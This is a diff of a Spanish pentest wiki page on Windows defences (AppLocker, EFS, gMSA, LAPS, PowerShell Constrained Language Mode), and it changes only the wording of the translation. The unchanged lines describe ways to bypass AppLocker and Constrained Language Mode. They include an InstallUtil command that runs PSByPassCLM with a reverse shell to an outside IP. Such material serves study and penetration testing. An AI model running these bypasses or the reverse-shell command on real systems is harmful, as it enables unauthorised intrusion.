@@ -34,10 +34,10 @@ C:\Windows\Tasks
 C:\windows\tracing
 ```
 - Los binarios comúnmente **confiables** [**"LOLBAS's"**](https://lolbas-project.github.io/) también pueden ser útiles para eludir AppLocker.
-- **Las reglas mal escritas también podrían ser eludidas**
+- **Reglas mal escritas también podrían ser eludidas**
 - Por ejemplo, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, puedes crear una **carpeta llamada `allowed`** en cualquier lugar y será permitida.
 - Las organizaciones también suelen centrarse en **bloquear el ejecutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, pero se olvidan de las **otras** [**ubicaciones de ejecutables de PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
-- **La aplicación de DLL rara vez está habilitada** debido a la carga adicional que puede poner en un sistema y la cantidad de pruebas requeridas para asegurar que nada se rompa. Así que usar **DLLs como puertas traseras ayudará a eludir AppLocker**.
+- **La imposición de DLL rara vez está habilitada** debido a la carga adicional que puede poner en un sistema y la cantidad de pruebas requeridas para asegurar que nada se rompa. Así que usar **DLLs como puertas traseras ayudará a eludir AppLocker**.
 - Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar código de Powershell** en cualquier proceso y eludir AppLocker. Para más información consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
 ## Almacenamiento de Credenciales
@@ -103,7 +103,7 @@ sc query windefend
 ```
 ## Encrypted File System (EFS)
 
-EFS asegura archivos a través de la encriptación, utilizando una **clave simétrica** conocida como la **Clave de Encriptación de Archivos (FEK)**. Esta clave se encripta con la **clave pública** del usuario y se almacena dentro del **flujo de datos alternativo** $EFS del archivo encriptado. Cuando se necesita la desencriptación, se utiliza la **clave privada** correspondiente del certificado digital del usuario para desencriptar la FEK del flujo $EFS. Más detalles se pueden encontrar [aquí](https://en.wikipedia.org/wiki/Encrypting_File_System).
+EFS asegura archivos a través de la encriptación, utilizando una **clave simétrica** conocida como la **Clave de Encriptación de Archivos (FEK)**. Esta clave se encripta con la **clave pública** del usuario y se almacena dentro del **flujo de datos alternativo** del archivo encriptado $EFS. Cuando se necesita la desencriptación, se utiliza la correspondiente **clave privada** del certificado digital del usuario para desencriptar la FEK del flujo $EFS. Más detalles se pueden encontrar [aquí](https://en.wikipedia.org/wiki/Encrypting_File_System).
 
 **Escenarios de desencriptación sin iniciación del usuario** incluyen:
 
@@ -121,10 +121,10 @@ Este método de encriptación permite **acceso transparente** a los archivos enc
 
 ### Ver información de EFS
 
-Verifique si un **usuario** ha **utilizado** este **servicio** comprobando si existe esta ruta: `C:\users\<username>\appdata\roaming\Microsoft\Protect`
+Verifica si un **usuario** ha **utilizado** este **servicio** comprobando si existe esta ruta: `C:\users\<username>\appdata\roaming\Microsoft\Protect`
 
-Verifique **quién** tiene **acceso** al archivo usando cipher /c \<file>\
-También puede usar `cipher /e` y `cipher /d` dentro de una carpeta para **encriptar** y **desencriptar** todos los archivos
+Verifica **quién** tiene **acceso** al archivo usando cipher /c \<file>\
+También puedes usar `cipher /e` y `cipher /d` dentro de una carpeta para **encriptar** y **desencriptar** todos los archivos
 
 ### Desencriptando archivos EFS
 
@@ -142,13 +142,13 @@ https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
 
 Microsoft desarrolló **Group Managed Service Accounts (gMSA)** para simplificar la gestión de cuentas de servicio en infraestructuras de TI. A diferencia de las cuentas de servicio tradicionales que a menudo tienen habilitada la configuración de "**La contraseña nunca expira**", los gMSA ofrecen una solución más segura y manejable:
 
-- **Gestión Automática de Contraseñas**: los gMSA utilizan una contraseña compleja de 240 caracteres que cambia automáticamente de acuerdo con la política del dominio o del equipo. Este proceso es manejado por el Servicio de Distribución de Claves (KDC) de Microsoft, eliminando la necesidad de actualizaciones manuales de contraseñas.
+- **Gestión Automática de Contraseñas**: los gMSA utilizan una contraseña compleja de 240 caracteres que cambia automáticamente de acuerdo con la política del dominio o computadora. Este proceso es manejado por el Servicio de Distribución de Claves (KDC) de Microsoft, eliminando la necesidad de actualizaciones manuales de contraseñas.
 - **Seguridad Mejorada**: estas cuentas son inmunes a bloqueos y no pueden ser utilizadas para inicios de sesión interactivos, mejorando su seguridad.
 - **Soporte para Múltiples Hosts**: los gMSA pueden ser compartidos entre múltiples hosts, lo que los hace ideales para servicios que se ejecutan en múltiples servidores.
-- **Capacidad de Tareas Programadas**: a diferencia de las cuentas de servicio administradas, los gMSA admiten la ejecución de tareas programadas.
-- **Gestión Simplificada de SPN**: el sistema actualiza automáticamente el Nombre Principal del Servicio (SPN) cuando hay cambios en los detalles de sAMaccount del equipo o en el nombre DNS, simplificando la gestión de SPN.
+- **Capacidad de Tareas Programadas**: a diferencia de las cuentas de servicio administradas, los gMSA soportan la ejecución de tareas programadas.
+- **Gestión Simplificada de SPN**: el sistema actualiza automáticamente el Nombre Principal del Servicio (SPN) cuando hay cambios en los detalles de sAMaccount de la computadora o en el nombre DNS, simplificando la gestión de SPN.
 
-Las contraseñas para los gMSA se almacenan en la propiedad LDAP _**msDS-ManagedPassword**_ y se restablecen automáticamente cada 30 días por los Controladores de Dominio (DC). Esta contraseña, un blob de datos encriptados conocido como [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), solo puede ser recuperada por administradores autorizados y los servidores en los que están instalados los gMSA, asegurando un entorno seguro. Para acceder a esta información, se requiere una conexión segura como LDAPS, o la conexión debe estar autenticada con 'Sealing & Secure'.
+Las contraseñas para los gMSA se almacenan en la propiedad LDAP _**msDS-ManagedPassword**_ y se restablecen automáticamente cada 30 días por los Controladores de Dominio (DCs). Esta contraseña, un blob de datos encriptado conocido como [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), solo puede ser recuperada por administradores autorizados y los servidores en los que están instalados los gMSA, asegurando un entorno seguro. Para acceder a esta información, se requiere una conexión segura como LDAPS, o la conexión debe ser autenticada con 'Sealing & Secure'.
 
 ![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)
 
@@ -170,7 +170,7 @@ La **Solución de Contraseña de Administrador Local (LAPS)**, disponible para d
 
 ## Modo de Lenguaje Restringido de PowerShell
 
-PowerShell [**Modo de Lenguaje Restringido**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **bloquea muchas de las características** necesarias para usar PowerShell de manera efectiva, como bloquear objetos COM, permitiendo solo tipos .NET aprobados, flujos de trabajo basados en XAML, clases de PowerShell, y más.
+PowerShell [**Modo de Lenguaje Restringido**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **bloquea muchas de las características** necesarias para usar PowerShell de manera efectiva, como bloquear objetos COM, permitir solo tipos .NET aprobados, flujos de trabajo basados en XAML, clases de PowerShell y más.
 
 ### **Verificar**
 ```bash
@@ -182,8 +182,8 @@ $ExecutionContext.SessionState.LanguageMode
 #Easy bypass
 Powershell -version 2
 ```
-En Windows actual, esa elusión no funcionará, pero puedes usar [ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
-**Para compilarlo, es posible que necesites** **_Agregar una Referencia_** -> _Explorar_ -> _Explorar_ -> agregar `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` y **cambiar el proyecto a .Net4.5**.
+En Windows actual, esa elusión no funcionará, pero puedes usar [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
+**Para compilarlo, es posible que necesites** **_Agregar una Referencia_** -> _Examinar_ -> _Examinar_ -> agregar `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` y **cambiar el proyecto a .Net4.5**.
 
 #### Elusión directa:
 ```bash
@@ -193,7 +193,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar código de Powershell** en cualquier proceso y eludir el modo restringido. Para más información consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar código de Powershell** en cualquier proceso y eludir el modo restringido. Para más información, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
 ## Política de Ejecución de PS
 
